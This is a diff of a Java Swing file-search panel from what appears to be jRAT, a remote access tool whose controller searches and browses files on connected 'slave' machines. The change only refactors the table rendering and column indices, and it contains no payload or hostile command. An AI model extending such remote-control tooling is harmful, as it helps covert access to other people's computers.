@@ -7,6 +7,7 @@ import io.jrat.client.packets.outgoing.Packet53StartSearch;
 import io.jrat.client.packets.outgoing.Packet54StopSearch;
 import io.jrat.client.ui.frames.FrameRemoteFiles;
 import io.jrat.client.ui.renderers.JComboBoxIconRenderer;
+import io.jrat.client.ui.renderers.table.FileSearchTableRenderer;
 import io.jrat.client.utils.IconUtils;
 
 import java.awt.Component;
@@ -32,7 +33,6 @@ import javax.swing.JToggleButton;
 import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
-
 @SuppressWarnings("serial")
 public class PanelControlSearch extends PanelControlParent {
 
@@ -42,9 +42,14 @@ public class PanelControlSearch extends PanelControlParent {
 	private JTextField txt;
 	private final ButtonGroup buttonGroup = new ButtonGroup();
 	private JComboBox<String> cbDrives;
+	private FileSearchTableRenderer renderer;
 
 	public DefaultTableModel getModel() {
 		return model;
+	}
+	
+	public FileSearchTableRenderer getRenderer() {
+		return renderer;
 	}
 
 	public PanelControlSearch(Slave slave) {
@@ -89,20 +94,12 @@ public class PanelControlSearch extends PanelControlParent {
 			cbDrives.addItem(drive.getName());
 		}
 
-		table = new JTable() {
-			@SuppressWarnings({ "unchecked", "rawtypes" })
-			@Override
-			public Class getColumnClass(int column) {
-				if (column == 0) {
-					return ImageIcon.class;
-				}
-				return super.getColumnClass(column);
-			}
-		};
-		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { " ", "Path", "Name" }));
-		table.getColumnModel().getColumn(0).setPreferredWidth(30);
-		table.getColumnModel().getColumn(1).setPreferredWidth(392);
-		table.getColumnModel().getColumn(2).setPreferredWidth(178);
+		table = new JTable();
+		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Path", "Name" }));
+		table.getColumnModel().getColumn(0).setPreferredWidth(392);
+		table.getColumnModel().getColumn(1).setPreferredWidth(178);
+		renderer = new FileSearchTableRenderer();
+		table.setDefaultRenderer(Object.class, renderer);
 
 		JPopupMenu popupMenu = new JPopupMenu();
 		addPopup(table, popupMenu);
@@ -118,7 +115,7 @@ public class PanelControlSearch extends PanelControlParent {
 						frame = new FrameRemoteFiles(sl);
 						frame.setVisible(true);
 					}
-					String val = model.getValueAt(row, 1).toString();
+					String val = model.getValueAt(row, 0).toString();
 					String path = val.substring(0, val.lastIndexOf(sl.getFileSeparator()));
 					sl.addToSendQueue(new Packet15ListFiles(path));
 					frame.txtDir.setText(path);
@@ -141,7 +138,7 @@ public class PanelControlSearch extends PanelControlParent {
 						frame = new FrameRemoteFiles(sl);
 						frame.setVisible(true);
 					}
-					String val = model.getValueAt(row, 1).toString();
+					String val = model.getValueAt(row, 0).toString();
 					String path = val.substring(0, val.lastIndexOf(sl.getFileSeparator()));
 					sl.addToSendQueue(new Packet15ListFiles(path));
 					frame.txtDir.setText(path);
